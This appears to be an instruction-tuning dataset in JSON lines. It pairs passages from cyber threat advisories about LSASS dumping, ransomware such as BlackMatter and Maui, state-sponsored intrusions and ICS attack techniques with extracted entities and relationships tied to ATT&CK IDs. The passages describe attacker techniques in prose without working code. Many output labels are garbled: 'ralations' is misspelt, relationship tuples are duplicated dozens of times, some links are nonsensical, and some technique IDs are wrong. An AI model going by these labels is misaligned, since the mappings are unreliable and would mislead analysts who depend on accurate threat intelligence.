{"instruction": "T1003.001 The actors were observed trying to dump LSASS process. Mitigation: With Windows 10, Microsoft implemented new protections called Credential Guard to protect the LSA secrets that can be used to obtain credentials through forms of credential dumping [M1043] Mitigation: On Windows 10, enable Attack Surface Reduction (ASR) rules to secure LSASS and prevent credential stealing [M1040]. Mitigation: Ensure that local administrator accounts have complex, unique passwords across all systems on the network [M1027]. Detection: Monitor for unexpected processes interacting with LSASS.exe. Common credential dumpers such as Mimikatz access LSASS.exe by opening the process, locating the LSA secrets key, and decrypting the sections in memory where credential details are stored. [DS0009]. Detection: Monitor executed commands and arguments that may attempt to access credential material stored in the process memory of the LSASS [DS0017]. Credentials from Password Stores T1555 The actors used Mimikatz to harvest credentials.", "input": null, "output": "Named Entities: (T1003.001, technique), (Mimikatz, tool), (LSASS.exe, file), (T1555, technique)\nRelationships: No related ralations."}
{"instruction": "Valid Accounts T1078 Actors obtained and abused credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. In this case, they exploited an organization\u2019s multifunctional device domain account used to access the organization\u2019s Microsoft Exchange server via OWA. Execution Technique Title ID Use Windows Management Instrumentation T1047 Actors used Impacket tools wmiexec.py and smbexec.py to leverage Windows Management Instrumentation and execute malicious commands. Command and Scripting Interpreter T1059 Actors abused command and script interpreters to execute commands. Command and Scripting Interpreter: PowerShell T1059.001 Actors abused PowerShell commands and scripts to map shared drives by specifying a path to one location and retrieving the items from another. See Appendix: Windows Command Shell Activity for additional information. Command and Scripting Interpreter: Windows Command Shell T1059.003", "input": null, "output": "Named Entities: (T1078, technique), (T1047, technique), (Impacket tools, tool), (wmiexec.py, file), (smbexec.py, file), (T1059, technique), (T1059.001, technique), (T1059.003, technique)\nRelationships: No related ralations."}
{"instruction": "Actors abused the Windows Command Shell to learn about the organization\u2019s environment and to collect sensitive data. See Appendix: Windows Command Shell Activity for additional information, including specific commands used. The actors used Impacket tools, which enable a user with credentials to run commands on the remote device through the Command Shell. Command and Scripting Interpreter: Python T1059.006 The actors used two Impacket tools: wmiexec.py and smbexec.py. Shared Modules T1129 Actors executed malicious payloads via loading shared modules. The Windows module loader can be instructed to load DLLs from arbitrary local paths and arbitrary Universal Naming Convention (UNC) network paths. System Services T1569 Actors abused system services to execute commands or programs on the victim\u2019s network. Persistence Technique Title ID Use Valid Accounts T1078 Actors obtained and abused credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Create or Modify System Process", "input": null, "output": "Named Entities: (Impacket tools, tool), (T1059.006, technique), (wmiexec.py, file), (smbexec.py, file), (T1129, technique), (T1569, technique), (T1078, technique)\nRelationships: (Impacket tools, tool, wmiexec.py), (Impacket tools, tool, smbexec.py)"}
{"instruction": "T1543 Actors were observed creating or modifying system processes. Privilege Escalation Technique Title ID Use Valid Accounts T1078 Actors obtained and abused credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. In this case, they exploited an organization\u2019s multifunctional device domain account used to access the organization\u2019s Microsoft Exchange server via OWA. Defense Evasion Technique Title ID Use Masquerading: Match Legitimate Name or Location T1036.005 Actors masqueraded the archive utility WinRAR.exe by renaming it VMware.exe to evade defenses and observation. Indicator Removal on Host T1070 Actors deleted or modified artifacts generated on a host system to remove evidence of their presence or hinder defenses. Indicator Removal on Host: File Deletion T1070.004 Actors used the del.exe command with the /f parameter to force the deletion of read-only files with the *.rar and tempg* wildcards. Valid Accounts T1078", "input": null, "output": "Named Entities: (T1543, technique), (T1078, technique), (T1036.005, technique), (T1070, technique), (T1070.004, technique), (del.exe, file)\nRelationships: No related ralations."}
{"instruction": "The threat actor used route print to display the entries in the local IP routing table. System Network Configuration Discovery: Internet Connection Discovery T1016.001 Actors checked for internet connectivity on compromised systems. This may be performed during automated discovery and can be accomplished in numerous ways. System Owner/User Discovery T1033 Actors attempted to identify the primary user, currently logged in user, set of users that commonly use a system, or whether a user is actively using the system. System Network Connections Discovery T1049 Actors used the netstat command to display TCP connections, prevent hostname determination of foreign IP addresses, and specify the protocol for TCP. Process Discovery T1057 Actors used the tasklist command to get information about running processes on a system and determine if the system was a VMware virtual machine.", "input": null, "output": "Named Entities: (T1016.001, technique), (T1033, technique), (T1049, technique), (T1057, technique), (VMware virtual machine, tool)\nRelationships: No related ralations."}
{"instruction": "Archive Collected Data: Archive via Utility T1560.001 Actor used PowerShell commands and WinRAR to compress and/or encrypt collected data prior to exfiltration. Data from Network Shared Drive T1039 Actors likely used net share command to display information about shared resources on the local computer and decide which directories to exploit, the powershell dir command to map shared drives to a specified path and retrieve items from another, and the ntfsinfo command to search network shares on computers they have compromised to find files of interest. The actors used dir.exe to display a list of a directory's files and subdirectories matching a certain text string. Data Staged: Remote Data Staging T1074.002 The actors split collected files into approximately 3 MB chunks located on the Exchange server within the CU2\\he\\debug directory. Command and Control Technique Title ID Use Non-Application Layer Protocol T1095", "input": null, "output": "Named Entities: (T1560.001, technique), (PowerShell, tool), (WinRAR, tool), (T1039, technique), (dir.exe, file), (T1074.002, technique), (Exchange server, tool), (T1095, technique)\nRelationships: (T1095, use, PowerShell), (T1095, use, WinRAR), (T1095, use, powershell dir), (T1095, use, dir.exe), (T1095, use, Exchange server)"}
{"instruction": "Operate the targeted control system. Functionally, this includes the ability to modify analog and digital values internal to the system (changing alarms and adding or modifying user accounts), or to change output control points \u2014 this includes abilities such as altering tap changer output signals, turbine speed demand, and opening and closing breakers. (Manipulation of Control [T0831]) Impair the system's ability to report data. Functionally, this is accomplished by degrading or disrupting communications with external communications circuits (e.g., ICCP , HDLC , PLC , VSAT, SCADA radio, other radio frequency mediums), remote terminal units (RTUs) or programmable logic controllers (PLCs), connected business or corporate networks, HMI subnetworks, other remote I/O, and any connected Historian/bulk data storage. (Block Reporting Message [T0804], Denial of View [T0815])", "input": null, "output": "Named Entities: (T0831, technique), (T0804, technique), (T0815, technique)\nRelationships: No related ralations."}
{"instruction": "Deny the operator's ability to control the targeted system. Functionally, this includes the ability to stop, abort, or corrupt the system\u2019s operating system (OS) or the supervisory control and data acquisition (SCADA) system\u2019s software functionality. (Denial of Control [T0813]) Enable remote or local reconnaissance on the control system. Functionally, an actor could obtain system configuration information to enable development of a modified system configuration or a custom tool. (Collection [TA0100], Theft of Operational Information [T0882])", "input": null, "output": "Named Entities: (T0813, technique), (TA0100, technique), (T0882, technique)\nRelationships: No related ralations."}
{"instruction": "During encryption, Maui creates a temporary file for each file it encrypts using GetTempFileNameW(). Maui uses the temporary to stage output from encryption. After encrypting files, Maui creates maui.log, which contains output from Maui execution. Actors likely exfiltrate [TA0010] maui.log and decrypt the file using associated decryption tools. See Stairwell Threat Report: Maui Ransomware for additional information on Maui ransomware, including YARA rules and a key extractor.", "input": null, "output": "Named Entities: (Maui, malware), (maui.log, file), (TA0010, technique)\nRelationships: (Maui, create, maui.log), (Maui, use, TA0010)"}
{"instruction": "Encrypts victim files with the AES-256 encryption algorithm; the resulting key is then encrypted with an RSA-2048 public key [T1486]. Runs every 60 seconds, encrypting all files except those critical to the functionality of the victim\u2019s machine and those that have the designated encrypted file extension. Establishes persistence by copying an executable (svhost.exe or svhostt.exe) to the %APPDATA%\\Roaming directory and scheduling a task to run the ransomware every 15 minutes. Attempts to prevent standard recovery techniques by deleting local backups, disabling startup recovery options, and deleting shadow copies [T1490].", "input": null, "output": "Named Entities: (T1486, technique), (svhost.exe, file), (svhostt.exe, file), (T1490, technique)\nRelationships: No related ralations."}
{"instruction": "Upon gaining an initial foothold into a telecommunications organization or network service provider, PRC state-sponsored cyber actors have identified critical users and infrastructure including systems critical to maintaining the security of authentication, authorization, and accounting. After identifying a critical Remote Authentication Dial-In User Service (RADIUS) server, the cyber actors gained credentials to access the underlying Structured Query Language (SQL) database [T1078] and utilized SQL commands to dump the credentials [T1555], which contained both cleartext and hashed passwords for user and administrative accounts.", "input": null, "output": "Named Entities: (PRC state-sponsored cyber actors, attacker), (T1078, technique), (T1555, technique)\nRelationships: (PRC state-sponsored cyber actors, use, T1555), (PRC state-sponsored cyber actors, use, T1555)"}
{"instruction": "Having gained credentials from the RADIUS server, PRC state-sponsored cyber actors used those credentials with custom automated scripts to authenticate to a router via Secure Shell (SSH), execute router commands, and save the output [T1119]. These scripts targeted Cisco and Juniper routers and saved the output of the executed commands, including the current configuration of each router. After successfully capturing the command output, these configurations were exfiltrated off network to the actor\u2019s infrastructure [TA0010]. The cyber actors likely used additional scripting to further automate the exploitation of medium to large victim networks, where routers and switches are numerous, to gather massive numbers of router configurations that would be necessary to successfully manipulate traffic within the network.", "input": null, "output": "Named Entities: (PRC state-sponsored cyber actors, attacker), (RADIUS server, tool), (T1119, technique), (TA0010, technique)\nRelationships: (PRC state-sponsored cyber actors, gain credentials from, RADIUS server), (PRC state-sponsored cyber actors, use, TA0010), (PRC state-sponsored cyber actors, use, TA0010)"}
{"instruction": "Karakurt actors have typically provided screenshots or copies of stolen file directories as proof of stolen data. Karakurt actors have contacted victims\u2019 employees, business partners, and clients [T1591.002] with harassing emails and phone calls to pressure the victims to cooperate. The emails have contained examples of stolen data, such as social security numbers, payment accounts, private company emails, and sensitive business data belonging to employees or clients. Upon payment of ransoms, Karakurt actors have provided some form of proof of deletion of files and, occasionally, a brief statement explaining how the initial intrusion occurred.", "input": null, "output": "Named Entities: (Karakurt, malware), (T1591.002, technique)\nRelationships: (Karakurt, use, T1591.002)"}
{"instruction": "Technical Details Initial Intrusion Karakurt does not appear to target any specific sectors, industries, or types of victims. During reconnaissance [TA0043], Karakurt actors appear to obtain access to victim devices primarily: By purchasing stolen login credentials [T1589.001] [T1589.002]; Via cooperating partners in the cybercrime community, who provide Karakurt access to already compromised victims; or Through buying access to already compromised victims via third-party intrusion broker networks [T1589.001]. Note: Intrusion brokers, or intrusion broker networks, are malicious individual cyber actors or groups of actors who use a variety of tools and skills to obtain initial access to\u2014and often create marketable persistence within\u2014protected computer systems. Intrusion brokers then sell access to these compromised computer systems to other cybercriminal actors, such as those engaged in ransomware, business email compromise, corporate and government espionage, etc. Common intrusion vulnerabilities exploited for initial access [TA001] in Karakurt events include the following:", "input": null, "output": "Named Entities: (Karakurt, malware), (TA0043, technique), (T1589.001, technique), (T1589.002, technique), (T1589.001, technique), (intrusion broker networks, tool)\nRelationships: (Karakurt, use, T1589.001), (Karakurt, use, T1589.001), (Karakurt, use, intrusion broker networks), (intrusion broker networks, sell access to, Karakurt)"}
{"instruction": "Technical Details Malicious actors commonly use the following techniques to gain initial access to victim networks.[TA0001] Exploit Public-Facing Application [T1190] External Remote Services [T1133] Phishing [T1566] Trusted Relationship [T1199] Valid Accounts [T1078] Malicious cyber actors often exploit the following common weak security controls, poor configurations, and poor security practices to employ the initial access techniques. Multifactor authentication (MFA) is not enforced. MFA, particularly for remote desktop access, can help prevent account takeovers. With Remote Desktop Protocol (RDP) as one of the most common infection vector for ransomware, MFA is a critical tool in mitigating malicious cyber activity. Do not exclude any user, particularly adminstrators, from an MFA requirement. Incorrectly applied privileges or permissions and errors within access control lists. These mistakes can prevent the enforcement of access control rules and could allow unauthorized users or system processes to be granted access to objects.", "input": null, "output": "Named Entities: (TA0001, technique), (T1190, technique), (T1133, technique), (T1566, technique), (T1199, technique), (T1078, technique)\nRelationships: No related ralations."}
{"instruction": "Appendix: APT Cyber Tools Tactics, Techniques, and Procedures See tables 1 through 3 for TTPs associated with the cyber actors\u2019 tools described in this CSA mapped to the MITRE ATT&CK for ICS framework. See the ATT&CK for ICS framework for all referenced threat actor tactics and techniques. Table 1: APT Tool for Schneider Electric ICS TTPs Tactic Technique Execution Command-Line Interface [T0807] Scripting [T0853] Persistence Modify Program [T0889] System Firmware [T0857] Valid Accounts [T0859] Discovery Remote System Discovery [T0846] Remote System Information Discovery [T0888] Lateral Movement Default Credentials [T0812] Program Download [T0843] Valid Accounts [T0859] Collection Monitor Process State [T0801] Program Upload [T0845] Monitor Process State [T0801] Command and Control Commonly Used Port [T0885] Standard Application Layer Protocol [T0869] Inhibit Response Function Block Reporting Message [T0804] Block Command Message [T0803] Denial of Service [T0814] Data Destruction [T0809] Device Restart/Shutdown [T0816] System Firmware [T0857] Impair Process Control Modify Parameter [T0836]", "input": null, "output": "Named Entities: (Schneider Electric ICS, tool), (T0807, technique), (T0853, technique), (T0889, technique), (T0857, technique), (T0859, technique), (T0846, technique), (T0888, technique), (T0812, technique), (T0843, technique), (T0801, technique), (T0845, technique), (T0885, technique), (T0869, technique), (T0804, technique), (T0803, technique), (T0814, technique), (T0809, technique), (T0816, technique), (T0836, technique)\nRelationships: (Schneider Electric ICS, associated with, T0836), (Schneider Electric ICS, associated with, T0836), (Schneider Electric ICS, associated with, T0836), (Schneider Electric ICS, associated with, T0836), (Schneider Electric ICS, associated with, T0836), (Schneider Electric ICS, associated with, T0836), (Schneider Electric ICS, associated with, T0836), (Schneider Electric ICS, associated with, T0836), (Schneider Electric ICS, associated with, T0836), (Schneider Electric ICS, associated with, T0836), (Schneider Electric ICS, associated with, T0836), (Schneider Electric ICS, associated with, T0836), (Schneider Electric ICS, associated with, T0836), (Schneider Electric ICS, associated with, T0836), (Schneider Electric ICS, associated with, T0836), (Schneider Electric ICS, associated with, T0836), (Schneider Electric ICS, associated with, T0836), (Schneider Electric ICS, associated with, T0836), (Schneider Electric ICS, associated with, T0836), (Schneider Electric ICS, associated with, T0836), (Schneider Electric ICS, associated with, T0836)"}
{"instruction": "The malware itself is sophisticated and modular with basic core functionality to beacon (T1132.002) device information back to a server and enable files to be downloaded and executed. There is also functionality to add new modules while the malware is running, which allows Sandworm to implement additional capability as required. The NCSC has published a malware analysis report on Cyclops Blink which provides more detail about the malware. Post exploitation Post exploitation, Cyclops Blink is generally deployed as part of a firmware \u2018update\u2019 (T1542.001). This achieves persistence when the device is rebooted and makes remediation harder.", "input": null, "output": "Named Entities: (T1132.002, technique), (Sandworm, attacker), (Cyclops Blink, malware), (T1542.001, technique)\nRelationships: (Cyclops Blink, use, T1542.001), (Sandworm, use, Cyclops Blink), (Cyclops Blink, use, T1542.001)"}
{"instruction": "Victim devices are organized into clusters and each deployment of Cyclops Blink has a list of command and control (C2) IP addresses and ports that it uses (T1008). All the known C2 IP addresses to date have been used by compromised WatchGuard firewall devices. Communications between Cyclops Blink clients and servers are protected under Transport Layer Security (TLS) (T1071.001), using individually generated keys and certificates. Sandworm manages Cyclops Blink by connecting to the C2 layer through the Tor network.", "input": null, "output": "Named Entities: (Cyclops Blink, malware), (T1008, technique), (T1071.001, technique), (Tor network, tool)\nRelationships: (Cyclops Blink, use, T1071.001), (Cyclops Blink, use, T1071.001), (Cyclops Blink, connect to, Tor network)"}
{"instruction": "The following table maps observed Russian state-sponsored cyber activity to the MITRE ATT&CK for Enterprise framework. Several of the techniques listed in the table are based on observed procedures in contextual order. Therefore, some of the tactics and techniques listed in their respective columns appear more than once. See Appendix A for a functional breakdown of TTPs. Note: for specific countermeasures related to each ATT&CK technique, see the Enterprise Mitigations section and MITRE D3FEND\u2122. Table 1: Observed Tactics, Techniques, and Procedures (TTPs) Tactic Technique Procedure Reconnaissance [TA0043] Credential Access [TA0006] Gather Victim Identity Information: Credentials [T1589.001] Brute Force [T1110] Threat actors used brute force to identify valid account credentials for domain and M365 accounts. After obtaining domain credentials, the actors used them to gain initial access. Initial Access [TA0001] External Remote Services [T1133]", "input": null, "output": "Named Entities: (Russian state-sponsored cyber activity, attacker), (TA0043, technique), (TA0006, technique), (TA0001, technique), (T1589.001, technique), (T1110, technique), (T1133, technique)\nRelationships: No related ralations."}
{"instruction": "Initial Access consists of techniques that use various entry vectors to gain their initial foothold within a network. For example, the adversary may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion [T1078].[18] These specific actors obtained and abused credentials of domain [T1078.002] and cloud accounts [T1078.004].[19] The actors also used external remote services to gain access to systems [T1133].[20] The adversary took advantage of weaknesses in internet-facing servers and conducted SQL injection attacks against organizations' external websites [T1190].[21] Finally, they sent spearphishing emails with a malicious link in an attempt to gain access [T1566.002].[22] ID Name Description T1078 Valid Accounts Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access. T1078.002 Valid Accounts: Domain Accounts", "input": null, "output": "Named Entities: (T1078, technique), (T1078.002, technique), (T1078.004, technique), (T1133, technique), (T1190, technique), (T1566.002, technique)\nRelationships: No related ralations."}
{"instruction": "Adversaries may obtain and abuse credentials of a domain account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. T1078.004 Valid Accounts: Cloud Accounts Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. T1133 External Remote Services Adversaries may leverage external-facing remote services to initially access and/or persist within a network. T1190 Exploit Public-Facing Application Adversaries may attempt to take advantage of a weakness in an internet-facing computer or program using software, data, or commands in order to cause unintended or unanticipated behavior. T1566.002 Phishing: Spearphishing Link Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Persistence [TA0003]", "input": null, "output": "Named Entities: (T1078.004, technique), (T1133, technique), (T1190, technique), (T1566.002, technique), (TA0003, technique)\nRelationships: No related ralations."}
{"instruction": "Persistence consists of techniques that adversaries use to keep access to systems across restarts, changed credentials, and other interruptions that could cut off their access. The adversary obtains and abuses credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion [T1078].[23] ID Name Description T1078 Valid Accounts Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Privilege Escalation [TA0004] Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. The adversary obtains and abuses credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion [T1078].[24] Specifically in this case, credentials of cloud accounts [T1078.004] were obtained and abused.[25] ID Name Description T1078 Valid Accounts", "input": null, "output": "Named Entities: (T1078, technique), (TA0004, technique), (T1078.004, technique)\nRelationships: No related ralations."}
{"instruction": "Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access. T1078.004 Valid Accounts: Cloud Accounts Adversaries may obtain and abuse credentials of a cloud account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Defense Evasion [TA0005] Defense Evasion consists of techniques that adversaries use to avoid detection throughout their compromise. The adversary made its executables and files difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit [T1027].[26] ID Name Description T1027 Obfuscated Files or Information Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. Credential Access [TA0006]", "input": null, "output": "Named Entities: (T1078.004, technique), (TA0005, technique), (TA0006, technique), (T1027, technique)\nRelationships: No related ralations."}
{"instruction": "Credential Access consists of techniques for stealing credentials like account names and passwords. The adversary attempted to access or create a copy of the Active Directory (AD) domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights [T1003.003].[27] The adversary also used a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials [T1110.003].[28] ID Name Description T1003.003 OS Credential Dumping: NTDS Adversaries may attempt to access or create a copy of the Active Directory domain database to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. T1110.003 Brute Force: Password Spraying Adversaries may use a single or small list of commonly used passwords against many different accounts to attempt to acquire valid account credentials. Discovery [TA0007]", "input": null, "output": "Named Entities: (T1003.003, technique), (T1110.003, technique), (TA0007, technique)\nRelationships: No related ralations."}
{"instruction": "Russian state-sponsored APT actors have used cmd.exe to execute commands on remote machines. They have also used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and to execute other commands. Persistence [TA0003] Valid Accounts [T1078] Russian state-sponsored APT actors have used credentials of existing accounts to maintain persistent, long-term access to compromised networks. Credential Access [TA0006] Brute Force: Password Guessing [T1110.001] and Password Spraying [T1110.003] Russian state-sponsored APT actors have conducted brute-force password guessing and password spraying campaigns. OS Credential Dumping: NTDS [T1003.003] Russian state-sponsored APT actors have exfiltrated credentials and exported copies of the Active Directory database ntds.dit. Steal or Forge Kerberos Tickets: Kerberoasting [T1558.003] Russian state-sponsored APT actors have performed \u201cKerberoasting,\u201d whereby they obtained the Ticket Granting Service (TGS) Tickets for Active Directory Service Principal Names (SPN) for offline cracking. Credentials from Password Stores [T1555]", "input": null, "output": "Named Entities: (Russian state-sponsored APT actors, attacker), (cmd.exe, file), (PowerShell, tool), (TA0003, technique), (T1078, technique), (TA0006, technique), (T1110.001, technique), (T1110.003, technique), (T1003.003, technique), (T1558.003, technique), (T1555, technique)\nRelationships: (Russian state-sponsored APT actors, use, cmd.exe), (Russian state-sponsored APT actors, use, PowerShell), (Russian state-sponsored APT actors, persistence, T1555), (Russian state-sponsored APT actors, use, T1555), (Russian state-sponsored APT actors, use, T1555), (Russian state-sponsored APT actors,  use, T1555), (Russian state-sponsored APT actors, use, T1555), (Russian state-sponsored APT actors, use, T1555), (Russian state-sponsored APT actors, use, T1555)"}
{"instruction": "The FBI and CISA are aware of reports of malicious cyber actors likely using exploits against CVE-2021-44077 to gain access [T1190] to ManageEngine ServiceDesk Plus, as early as late October 2021. The actors have been observed using various tactics, techniques and procedures (TTPs), including: Writing webshells [T1505.003] to disk for initial persistence Obfuscating and Deobfuscating/Decoding Files or Information [T1027 and T1140] Conducting further operations to dump user credentials [T1003] Living off the land by only using signed Windows binaries for follow-on actions [T1218] Adding/deleting user accounts as needed [T1136] Stealing copies of the Active Directory database (NTDS.dit) [T1003.003] or registry hives Using Windows Management Instrumentation (WMI) for remote execution [T1047] Deleting files to remove indicators from the host [T1070.004] Discovering domain accounts with the net Windows command [T1087.002] Using Windows utilities to collect and archive files for exfiltration [T1560.001] Using custom symmetric encryption for command and control (C2) [T1573.001]", "input": null, "output": "Named Entities: (CVE-2021-44077, vulnerability), (T1190, technique), (T1505.003, technique), (T1027, technique), (T1140, technique), (T1003, technique), (T1218, technique), (T1136, technique), (NTDS.dit, file), (T1003.003, technique), (T1047, technique), (T1070.004, technique), (T1087.002, technique), (T1560.001, technique), (T1573.001, technique)\nRelationships: (T1573.001, used by, CVE-2021-44077), (T1573.001, used by, T1573.001), (T1573.001, used by,  actors), (T1573.001, used by,  actors), (T1573.001, used by, actors), (T1573.001, used by,  actors), (NTDS.dit, stolen by, T1573.001), (T1573.001, used by,  actors), (T1573.001, used by,  actors), (T1573.001, used by,  actors), (T1573.001, used by,  actors), (T1573.001, used by,  actors), (T1573.001, used by,  actors)"}
{"instruction": "Technique Procedure Persistence [TA0003] External Remote Services [T1133] BlackMatter leverages legitimate remote monitoring and management software and remote desktop software, often by setting up trial accounts, to maintain persistence on victim networks. Credential Access [TA0006] OS Credential Dumping: LSASS Memory [T1003.001] BlackMatter harvests credentials from Local Security Authority Subsystem Service (LSASS) memory using procmon. Discovery [TA0007] Remote System Discovery [T1018] BlackMatter leverages LDAP and SMB protocol to discover all hosts in the AD. Process Discovery [T1057] BlackMatter uses NtQuerySystemInformation to enumerate running processes. System Service Discovery [T1007] BlackMatter uses EnumServicesStatusExW to enumerate running services on the network. Lateral Movement [TA0008] Remote Services: SMB/Windows Admin Shares [T1021.002] BlackMatter uses srvsvc.NetShareEnumAll MSRPC function to enumerate and SMB to connect to all discovered shares, including ADMIN$, C$, SYSVOL, and NETLOGON. Exfiltration [TA0010] Exfiltration Over Web Service [T1567] BlackMatter attempts to exfiltrate data for extortion. Impact [TA0040] Data Encrypted for Impact [T1486]", "input": null, "output": "Named Entities: (BlackMatter, attacker), (TA0003, technique), (TA1133, technique), (TA0006, technique), (T1003.001, technique), (TA0007, technique), (T1018, technique), (T1057, technique), (T1007, technique), (TA0008, technique), (T1021.002, technique), (TA0010, technique), (T1567, technique), (TA0040, technique), (T1486, technique)\nRelationships: (BlackMatter, leverages, T1486), (BlackMatter, leverages, T1486), (BlackMatter, leverages, T1486), (BlackMatter, uses, T1486), (BlackMatter, leverages, T1486), (BlackMatter, leverages, T1486), (BlackMatter, uses, T1486), (BlackMatter, uses, T1486), (BlackMatter, uses, T1486), (BlackMatter, uses, T1486), (BlackMatter, attempts, T1486), (BlackMatter, impacts, T1486), (BlackMatter, encrypts, T1486)"}
{"instruction": "BlackMatter remotely encrypts shares via SMB protocol and drops a ransomware note in each directory. Disk Wipe [T1561] BlackMatter may wipe backup systems.", "input": null, "output": "Named Entities: (BlackMatter, malware), (ransomware, threat type), (T1561, technique)\nRelationships: (BlackMatter, use, T1561)"}
{"instruction": "Threat Overview Tactics, Techniques, and Procedures WWS facilities may be vulnerable to the following common tactics, techniques, and procedures (TTPs) used by threat actors to compromise IT and OT networks, systems, and devices. Spearphishing personnel to deliver malicious payloads, including ransomware [T1566]. Spearphishing is one of the most prevalent techniques used for initial access to IT networks. Personnel and their potential lack of cyber awareness are a vulnerability within an organization. Personnel may open malicious attachments or links to execute malicious payloads contained in emails from threat actors that have successfully bypassed email filtering controls. When organizations integrate IT with OT systems, attackers can gain access\u2014either purposefully or inadvertently\u2014to OT assets after the IT network has been compromised through spearphishing and other techniques. Exploitation of internet-connected services and applications that enable remote access to WWS networks [T1210].", "input": null, "output": "Named Entities: (ransomware, threat type), (T1566, technique), (T1210, technique)\nRelationships: No related ralations."}
{"instruction": "Zoho ManageEngine ADSelfService Plus build 6114, which Zoho released on September 6, 2021, fixes CVE-2021-40539. FBI, CISA, and CGCYBER strongly urge users and administrators to update to ADSelfService Plus build 6114. Additionally, FBI, CISA, and CGCYBER strongly urge organizations ensure ADSelfService Plus is not directly accessible from the internet. The FBI, CISA, and CGCYBER have reports of malicious cyber actors using exploits against CVE-2021-40539 to gain access [T1190] to ManageEngine ADSelfService Plus, as early as August 2021. The actors have been observed using various tactics, techniques, and procedures (TTPs), including: Frequently writing webshells [T1505.003] to disk for initial persistence Obfuscating and Deobfuscating/Decoding Files or Information [T1027 and T1140] Conducting further operations to dump user credentials [T1003] Living off the land by only using signed Windows binaries for follow-on actions [T1218] Adding/deleting user accounts as needed [T1136] Stealing copies of the Active Directory database (NTDS.dit) [T1003.003] or registry hives", "input": null, "output": "Named Entities: (CVE-2021-40539, vulnerability), (T1190, technique), (T1505.003, technique), (T1027, technique), (T1140, technique), (T1003, technique), (T1218, technique), (T1136, technique), (NTDS.dit, file)\nRelationships: No related ralations."}
{"instruction": "CISA and FBI assess that during these intrusions, China was successful in accessing the supervisory control and data acquisition (SCADA) networks at several U.S. natural gas pipeline companies. Chinese actors also gained information specific to dial-up access, including phone numbers, usernames, and passwords [T1120]. Dial-up modems continue to be prevalent in the Energy Sector, providing direct access into the ICS environment with little or no security and no monitoring, which makes them an optimal vector for hold-at-risk operations. The exfiltrated data provided the capabilities for the Chinese cyber actors to access ONG operational systems at a level where they could potentially conduct unauthorized operations. Exfiltrated Information and Assessed Motives", "input": null, "output": "Named Entities: (Chinese actors, attacker), (T1120, technique)\nRelationships: (Chinese actors, use, T1120)"}
{"instruction": "APT40 has used a combination of tool frameworks and malware to establish persistence, escalate privileges, map, and move laterally on victim networks. Additionally, APT40 conducted internal spearphishing attacks [T1534]. BADFLICK/Greencrash China Chopper [S0020] Cobalt Strike [S0154] Derusbi/PHOTO [S0021] Gh0stRAT [S0032] GreenRAT jjdoor/Transporter jumpkick Murkytop (mt.exe) [S0233] NanHaiShu [S0228] Orz/AirBreak [S0229] PowerShell Empire [S0363] PowerSploit [S0194] Server software component: Web Shell [TA1505.003] Defense Evasion [TA0005], Command and Control [TA0011], Collection [TA0009], and Exfiltration [TA0010] Use of steganography [T1027.003] to hide stolen data inside other files stored on GitHub Protocol impersonation [T1001.003] by using Application Programming Interface (API) keys for Dropbox accounts in commands to upload stolen data to make it appear that the activity was a legitimate use of the Dropbox service Protocol tunneling [T1572] and multi-hop proxies [T1090.003], including the use of Tor [S0183] Use of domain typosquatting for C2 infrastructure [T1583.001]", "input": null, "output": "Named Entities: (APT40, attacker), (T1534, technique), (TA1505.003, technique), (TA0005, technique), (TA0011, technique), (TA0009, technique), (TA0010, technique), (T1027.003, technique), (T1001.003, technique), (T1572, technique), (T1090.003, technique), (S0183, tool), (T1583.001, technique)\nRelationships: (APT40, conduct, T1583.001), (APT40, use, T1583.001), (APT40, use, T1583.001), (APT40, use, T1583.001), (APT40, use, T1583.001), (APT40, use, T1583.001), (APT40, use, T1583.001), (APT40, use, T1583.001), (APT40, use, T1583.001), (APT40, use, T1583.001), (APT40, use, S0183), (APT40, use, T1583.001)"}
{"instruction": "Tactics: Reconnaissance [TA0043] Table 1: Chinese state-sponsored cyber actors\u2019 Reconnaissance TTPs with detection and mitigation recommendations Threat Actor Technique / Sub-Techniques Threat Actor Procedure(s) Detection and Mitigation Recommendations Defensive Tactics and Techniques Active Scanning [T1595] Chinese state-sponsored cyber actors have been assessed to perform reconnaissance on Microsoft\u00ae 365 (M365), formerly Office\u00ae 365, resources with the intent of further gaining information about the networks. These scans can be automated, through Python\u00ae scripts, to locate certain files, paths, or vulnerabilities. The cyber actors can gain valuable information on the victim network, such as the allocated resources, an organization\u2019s fully qualified domain name, IP address space, and open ports to target or exploit. Minimize the amount and sensitivity of data available to external parties, for example: Scrub user email addresses and contact lists from public websites, which can be used for social engineering, Share only necessary data and information with third parties, and", "input": null, "output": "Named Entities: (TA0043, technique), (Chinese state-sponsored cyber actors, attacker), (T1595,technique), (Microsoft 365, tool), (Python scripts, tool)\nRelationships: (Chinese state-sponsored cyber actors, use, TA0043), (Chinese state-sponsored cyber actors, use, TA0043), (Chinese state-sponsored cyber actors, gain information about, Microsoft 365), (Chinese state-sponsored cyber actors, automate, Python scripts)"}
